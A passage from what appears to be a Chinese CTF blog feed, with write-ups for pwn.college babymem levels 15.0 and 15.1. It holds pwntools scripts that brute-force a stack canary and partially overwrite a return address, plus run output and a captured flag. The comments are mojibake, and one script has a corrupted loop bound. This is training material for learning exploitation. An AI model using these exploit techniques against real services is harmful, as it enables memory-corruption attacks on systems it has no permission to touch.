class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>host = <span class="hljs-string">&#x27;localhost&#x27;</span>  <br>port = <span class="hljs-number">1337</span>  <br><br><span class="hljs-comment"># è¿æ¥åˆ°æœåŠ¡</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connect</span>():</span><br>    <span class="hljs-keyword">return</span> remote(host, port)<br><br><span class="hljs-comment"># å°è¯•ä¸€ä¸ªå­—èŠ‚ï¼Œçœ‹çœ‹ç¨‹åºæ˜¯å¦å´©æºƒ</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">try_byte</span>(<span class="hljs-params">p, payload</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Payload size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)).encode() )<br>    p.send(payload)<br>    <br>    <span class="hljs-keyword">try</span>:<br>        response = p.recvall(timeout=<span class="hljs-number">0.5</span>)<span class="hljs-comment"># not recv but recvall!</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;smash&#x27;</span> <span class="hljs-keyword">in</span> response :<span class="hljs-comment"># timeout can be smaller </span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> EOFError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># çˆ†ç ´é‡‘ä¸é›€</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">brute_force_canary</span>():</span><br>    canary = <span class="hljs-string">b&#x27;\x00&#x27;</span>  <span class="hljs-comment"># å·²çŸ¥æœ€é«˜ä½å­—èŠ‚æ˜¯0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>):<br>        found = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            p = connect()<br>            payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">120</span> + canary + <span class="hljs-built_in">bytes</span>([byte])<br>            <span class="hljs-built_in">print</span>(payload)<br>            <span class="hljs-keyword">if</span> try_byte(p, payload):<br>                canary += <span class="hljs-built_in">bytes</span>([byte])<br>                found = <span class="hljs-literal">True</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found byte <span class="hljs-subst">&#123;i&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">bytes</span>([byte]).<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>                p.close()<br>                <span class="hljs-keyword">break</span><br>            p.close()<br>    <span class="hljs-keyword">return</span> canary<br><br><span class="hljs-comment"># ä¸»æ”»å‡»é€»è¾‘</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    s = process(<span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span>)<br>    canary = brute_force_canary()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found canary: <span class="hljs-subst">&#123;canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = connect()<br>        <span class="hljs-comment"># å‘é€æ­£ç¡®çš„payloadï¼ŒåŒ…æ‹¬é‡‘ä¸é›€å’Œè¦†ç›–è¿”å›åœ°å€</span><br>        payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">120</span> + canary + <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span><br>        payload += p16(<span class="hljs-number">0x1F96</span>)  <br>        <span class="hljs-built_in">print</span>(payload)<br>        p.sendlineafter(<span class="hljs-string">&#x27;Payload size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)).encode() )<br>        p.send(payload)<br>       <br>        re = p.recvall(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(re)<br>        <span class="hljs-keyword">if</span> re.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span>(re)<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-comment">#finally:</span><br>        p.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs coq">Found byte <span class="hljs-number">7</span>: f2<br>Found canary: <span class="hljs-number">00</span>d92d0a018e2bf2<br>[â—] Opening connection to localhost on port <span class="hljs-number">1337</span>: Trying ::Opening connection to localhost on port <span class="hljs-number">1337</span>: Tryin[+] Opening connection to localhost on port <span class="hljs-number">1337</span>: Done<br>b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\xd9-\n\x01\x8e+\xf2BBBBBBBB\x96\x1f&#x27;<br>[+] Receiving all data: Done (<span class="hljs-number">5.46</span>KB)<br>[*] Closed connection to localhost port <span class="hljs-number">1337</span><br>b&#x27;You have chosen to send <span class="hljs-number">138</span> bytes of input!\nThis will allow you to write from <span class="hljs-number">0x7ffda0d6dd90</span> (the start of the input buffer)\nright up to (but not including) <span class="hljs-number">0x7ffda0d6de1a</span> (which is <span class="hljs-number">21</span> bytes beyond the <span class="hljs-keyword">end</span> of the buffer).\nOf these, you will overwrite <span class="hljs-number">2</span> bytes into the <span class="hljs-keyword">return</span> address.\nIf that number is greater than <span class="hljs-number">8</span>, you will overwrite the entire <span class="hljs-keyword">return</span> address.\n\nOverwriting the entire <span class="hljs-keyword">return</span> address is fine when we know\nthe whole address, but here, we only really know the last three nibbles.\nThese nibbles never <span class="hljs-built_in">change</span>, because pages are aligned to <span class="hljs-number">0x1000</span>.\nThis gives us a workaround: we can overwrite the least significant byte\nof the saved <span class="hljs-keyword">return</span> address, which we can know from debugging the binary,\nto retarget the <span class="hljs-keyword">return</span> to main to any instruction that shares the other <span class="hljs-number">7</span> bytes.\nSince that last byte will be constant between executions (due to page alignment),\nthis will always work.\nIf the address we want to redirect execution to is a bit farther away from\nthe saved <span class="hljs-keyword">return</span> address, and we need to write two bytes, <span class="hljs-keyword">then</span> one of those\nnibbles (the fourth least-significant one) will be a guess, and it will be\nincorrect <span class="hljs-number">15</span> of <span class="hljs-number">16</span> times.\nThis is okay: we can just run our exploit a few\ntimes <span class="hljs-built_in">until</span> it works (statistically, <span class="hljs-built_in">after</span> <span class="hljs-number">8</span> times or so).\nOne caveat <span class="hljs-built_in">in</span> this challenge is that the win_authed() function must <span class="hljs-built_in">first</span> auth:\nit only lets you win <span class="hljs-keyword">if</span> you provide it <span class="hljs-built_in">with</span> the argument <span class="hljs-number">0x1337</span>.\nSpeifically, the win_authed() function looks something like:\n    void win_authed(int token)\n    &#123;\n      <span class="hljs-keyword">if</span> (token != <span class="hljs-number">0x1337</span>) <span class="hljs-keyword">return</span>;\n      puts(<span class="hljs-string">&quot;You win! Here is your flag: &quot;</span>);\n      sendfile(<span class="hljs-number">1</span>, open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>), <span class="hljs-number">0</span>, <span class="hljs-number">256</span>);\n      puts(<span class="hljs-string">&quot;&quot;</span>);\n    &#125;\n\nSo how <span class="hljs-built_in">do</span> you pass the check? There *is* a way, and we will cover it later,\nbut <span class="hljs-keyword">for</span> now, we will simply bypass it! You can overwrite the <span class="hljs-keyword">return</span> address\nwith *any* value (<span class="hljs-built_in">as</span> long <span class="hljs-built_in">as</span> it points to executable code), not just the start\nof functions. <span class="hljs-keyword">Let</span>\&#x27;s overwrite past the token check <span class="hljs-built_in">in</span> win!\n\nTo <span class="hljs-built_in">do</span> this, we will need to analyze the program <span class="hljs-built_in">with</span> objdump, identify <span class="hljs-keyword">where</span>\nthe check is <span class="hljs-built_in">in</span> the win_authed() function, find the address <span class="hljs-built_in">right</span> <span class="hljs-built_in">after</span> the check,\nand write that address over the saved <span class="hljs-keyword">return</span> address.\n\nGo ahead and find this address now. When you\&#x27;re ready, input a buffer overflow\nthat will overwrite the saved <span class="hljs-keyword">return</span> address (<span class="hljs-built_in">at</span> <span class="hljs-number">0x7ffda0d6de18</span>, <span class="hljs-number">136</span> bytes into the buffer)\nwith the correct value.\n\nSend your payload (up to <span class="hljs-number">138</span> bytes)!\nYou sent <span class="hljs-number">138</span> bytes!\nLet\&#x27;s see what happened <span class="hljs-built_in">with</span> the stack:\n\n+---------------------------------+-------------------------+--------------------+\n|                  <span class="hljs-type">Stack</span> location |            <span class="hljs-type">Data</span> (bytes) |      <span class="hljs-type">Data</span> (LE int) |<span class="hljs-type">\n</span>+---------------------------------+-------------------------+--------------------+\n| <span class="hljs-type">0x00007ffda0d6dd50</span> (rsp+<span class="hljs-number">0x0000</span>) | <span class="hljs-type">60</span> dd d6 a0 fd <span class="hljs-number">7</span>f <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x00007ffda0d6dd60</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd58</span> (rsp+<span class="hljs-number">0x0008</span>) | <span class="hljs-type">68</span> ef d6 a0 fd <span class="hljs-number">7</span>f <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x00007ffda0d6ef68</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd60</span> (rsp+<span class="hljs-number">0x0010</span>) | <span class="hljs-type">58</span> ef d6 a0 fd <span class="hljs-number">7</span>f <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x00007ffda0d6ef58</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd68</span> (rsp+<span class="hljs-number">0x0018</span>) | <span class="hljs-type">a0</span> <span class="hljs-number">16</span> <span class="hljs-number">0</span>c d5 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x00000001d50c16a0</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd70</span> (rsp+<span class="hljs-number">0x0020</span>) | <span class="hljs-type">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x0000000000000001</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd78</span> (rsp+<span class="hljs-number">0x0028</span>) | <span class="hljs-type">23</span> <span class="hljs-number">17</span> <span class="hljs-number">0</span>c d5 <span class="hljs-number">8</span>a <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x0000008ad50c1723</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd80</span> (rsp+<span class="hljs-number">0x0030</span>) | <span class="hljs-type">8a</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x000000000000008a</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd88</span> (rsp+<span class="hljs-number">0x0038</span>) | <span class="hljs-type">90</span> dd d6 a0 fd <span class="hljs-number">7</span>f <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x00007ffda0d6dd90</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd90</span> (rsp+<span class="hljs-number">0x0040</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dd98</span> (rsp+<span class="hljs-number">0x0048</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dda0</span> (rsp+<span class="hljs-number">0x0050</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dda8</span> (rsp+<span class="hljs-number">0x0058</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddb0</span> (rsp+<span class="hljs-number">0x0060</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddb8</span> (rsp+<span class="hljs-number">0x0068</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddc0</span> (rsp+<span class="hljs-number">0x0070</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddc8</span> (rsp+<span class="hljs-number">0x0078</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddd0</span> (rsp+<span class="hljs-number">0x0080</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddd8</span> (rsp+<span class="hljs-number">0x0088</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dde0</span> (rsp+<span class="hljs-number">0x0090</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6dde8</span> (rsp+<span class="hljs-number">0x0098</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddf0</span> (rsp+<span class="hljs-number">0x00a0</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6ddf8</span> (rsp+<span class="hljs-number">0x00a8</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6de00</span> (rsp+<span class="hljs-number">0x00b0</span>) | <span class="hljs-type">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> | <span class="hljs-type">0x4141414141414141</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6de08</span> (rsp+<span class="hljs-number">0x00b8</span>) | <span class="hljs-type">00</span> d9 <span class="hljs-number">2</span>d <span class="hljs-number">0</span>a <span class="hljs-number">01</span> <span class="hljs-number">8</span>e <span class="hljs-number">2</span>b f2 | <span class="hljs-type">0xf22b8e010a2dd900</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6de10</span> (rsp+<span class="hljs-number">0x00c0</span>) | <span class="hljs-type">42</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> | <span class="hljs-type">0x4242424242424242</span> |<span class="hljs-type">\n</span>| <span class="hljs-type">0x00007ffda0d6de18</span> (rsp+<span class="hljs-number">0x00c8</span>) | <span class="hljs-type">96</span> <span class="hljs-number">1</span>f <span class="hljs-number">26</span> cb c1 <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> | <span class="hljs-type">0x000055c1cb261f96</span> |<span class="hljs-type">\n</span>+---------------------------------+-------------------------+--------------------+\nThe program\&#x27;s memory status:\n- the input buffer starts <span class="hljs-built_in">at</span> <span class="hljs-number">0x7ffda0d6dd90</span>\n- the saved frame pointer (of main) is <span class="hljs-built_in">at</span> <span class="hljs-number">0x7ffda0d6de10</span>\n- the saved <span class="hljs-keyword">return</span> address (previously to main) is <span class="hljs-built_in">at</span> <span class="hljs-number">0x7ffda0d6de18</span>\n- the saved <span class="hljs-keyword">return</span> address is now pointing to <span class="hljs-number">0x55c1cb261f96</span>.\n- the canary is stored <span class="hljs-built_in">at</span> <span class="hljs-number">0x7ffda0d6de08</span>.\n- the canary value is now <span class="hljs-number">0xf22b8e010a2dd900</span>.\n- the address of win_authed() is <span class="hljs-number">0x55c1cb261f7a</span>.\n\nIf you have managed to overwrite the <span class="hljs-keyword">return</span> address <span class="hljs-built_in">with</span> the correct value,\nchallenge() will jump straight to win_authed() when it returns.\nLet\&#x27;s <span class="hljs-built_in">try</span> it now!\n\nGoodbye!\nYou win! Here is your flag:\npwn.college&#123;<span class="hljs-number">0</span>TtgTnRU5N_7GHfxCH9SAvgrlhf<span class="hljs-number">.01</span>NxMDL1cTMzEzW&#125;\n\n\n&#x27;<br>[*] Stopped process &#x27;/challenge/babymem_level15<span class="hljs-number">.0</span>&#x27; (pid <span class="hljs-number">661</span>)<br>hacker@memory-errors~level15<span class="hljs-number">-0</span>:~$ <br></code></pre></td></tr></table></figure><h1 id="15-1"><a href="#15-1" class="headerlink" title="15-1"></a>15-1</h1><p>ç”¨ 15-0 çš„è„šæœ¬è·‘è¿™ä¸ªæŒ‘æˆ˜æ€»æ˜¯å¤±è´¥ï¼Œä½†æ˜¯ä¸çŸ¥é“é”™åœ¨å“ªï¼Œåæ¥å‘ç°æˆ–è®¸ä¸è¯¥æŠŠæœ€åå››ä½å†™æ­»ã€‚ç”±äºæœ€åçš„åœ°å€æ˜¯A BBBå½¢å¼ï¼Œå°è¯•æŠŠ A éå†æœ€ç»ˆé€šè¿‡äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>host = <span class="hljs-string">&#x27;localhost&#x27;</span> <br>port = <span class="hljs-number">1337</span>  <br><br><span class="hljs-comment"># è¿æ¥åˆ°æœåŠ¡</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connect</span>():</span><br>    <span class="hljs-keyword">return</span> remote(host, port)<br><br><span class="hljs-comment"># å°è¯•ä¸€ä¸ªå­—èŠ‚ï¼Œçœ‹çœ‹ç¨‹åºæ˜¯å¦å´©æºƒ</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">try_byte</span>(<span class="hljs-params">p, payload</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Payload size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)).encode() )<br>    p.send(payload)<br>    <br>    <span class="hljs-keyword">try</span>:<br>        response = p.recvall(timeout=<span class="hljs-number">0.15</span>)<span class="hljs-comment"># not recv but recvall!</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;smash&#x27;</span> <span class="hljs-keyword">in</span> response :<span class="hljs-comment"># timeout may can  be smaller </span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> EOFError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># çˆ†ç ´é‡‘ä¸é›€</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">brute_force_canary</span>():</span><br>    canary = <span class="hljs-string">b&#x27;\x00&#x27;</span>  <span class="hljs-comment"># å·²çŸ¥æœ€é«˜ä½å­—èŠ‚æ˜¯0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>):<br>        <span class="hljs-comment">#found = False</span><br>        <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(E):<br>            p = connect()<br>            payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">24</span> + canary + <span class="hljs-built_in">bytes</span>([byte])<br>            <span class="hljs-built_in">print</span>(payload)<br>            <span class="hljs-keyword">if</span> try_byte(p, payload):<br>                canary += <span class="hljs-built_in">bytes</span>([byte])<br>                <span class="hljs-comment">#found = True</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found byte <span class="hljs-subst">&#123;i&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">bytes</span>([byte]).<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>                p.close()<br>                <span class="hljs-keyword">break</span><br>            p.close()<br>    <span class="hljs-keyword">return</span> canary<br><br><span class="hljs-comment"># ä¸»æ”»å‡»é€»è¾‘</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    s = process(<span class="hljs-string">&#x27;/challenge/babymem_level15.1&#x27;</span>)<br>    canary = brute_force_canary()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found canary: <span class="hljs-subst">&#123;canary.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <span class="hljs-comment">#pause(10)</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>):<br>            p = connect()<br>            <span class="hljs-comment"># å‘é€æ­£ç¡®çš„payloadï¼ŒåŒ…æ‹¬é‡‘ä¸é›€å’Œè¦†ç›–è¿”å›åœ°å€</span><br>            payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">24</span> + canary + <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span><br>            payload += p16(<span class="hljs-number">0x1000</span>*i+<span class="hljs-number">0x333</span>)  <br>            <span class="hljs-built_in">print</span>(payload)<br>            p.sendlineafter(<span class="hljs-string">&#x27;Payload size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)).encode() )<br>        <span class="hljs-comment"># p.sendline(str(len(payload)).encode() )</span><br>            p.recvuntil(<span class="hljs-string">&#x27;bytes)!&#x27;</span>)<br>            p.send(payload)<br><br>            re = p.recvall(<span class="hljs-number">0.2</span>)<br>            <span class="hljs-comment">#print(re)</span><br>            <span class="hljs-keyword">if</span> re.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>                <span class="hljs-built_in">print</span>(re)<br>                <span class="hljs-keyword">break</span><br><br>            p.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br>    <br></code></pre></td></tr></table></figure><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>gdbåŠ¨æ€è°ƒè¯•ï¼ˆæˆ– idaï¼‰è·å¾—è¯»å…¥ç¼“å†²åŒºæ—¶çš„ rbp å’Œ rspï¼Œä»¥åŠ buf åœ°å€ï¼Œä»è€Œè®¡ç®—å‡ºè·ç¦» rbp çš„åç§»</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn college åˆ·é¢˜è®°å½•ï¼šdebugging refresher</title>
    <link href="/p/a2494a57/"/>
    <url>/p/a2494a57/</url>
    
